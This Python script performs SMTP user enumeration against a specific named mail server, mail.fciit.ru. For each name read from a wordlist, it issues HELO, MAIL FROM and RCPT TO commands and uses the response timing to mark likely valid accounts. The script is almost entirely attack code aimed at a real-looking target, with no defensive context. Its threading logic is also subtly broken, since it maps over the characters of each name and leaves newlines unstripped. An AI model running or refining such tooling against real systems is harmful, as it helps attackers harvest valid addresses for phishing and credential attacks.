import smtplib
import time
import concurrent.futures

green_color = "\033[92m"
reset_color = "\033[0m"

def print_result(result_time, to_address, response_code, response_message):
    if result_time < 4:
        print(f'{green_color}[+] {to_address} - {result_time}')
        print(f"{response_code} {response_message} {reset_color}")
        print('-----------------------------------------')
    else:
        print(f'[-] {to_address} - {result_time}')
        print(f"{response_code} {response_message}")
        print('-----------------------------------------')

def start_enum(user):
    smtp_server = 'mail.fciit.ru'
    smtp_port = 25

    from_address = 'ya@fciit.com'
    to_address = user

    server = smtplib.SMTP(smtp_server, smtp_port)

    helo_command = 'helo ya.ru'
    mail_command = f'MAIL FROM:<{from_address}>'
    rcpt_command = f'RCPT TO:<{user}@fciit.ru>'

    server.docmd(helo_command)
    server.docmd(mail_command)
    start_time = time.time()
    response_code, response_message = server.docmd(rcpt_command)
    end_time = time.time()

    result_time = end_time - start_time

    print_result(result_time, to_address, response_code, response_message)
    
    server.quit()

def setup_enum(file_path):
    with open(file_path) as file:  
        users = file.readlines()
        for user in users:
            # user = user.replace("\n", "")
            with concurrent.futures.ThreadPoolExecutor(max_workers=25) as executor:
                executor.map(start_enum, user)
            

if __name__ == '__main__':
    file_path = "test.txt"
    setup_enum(file_path)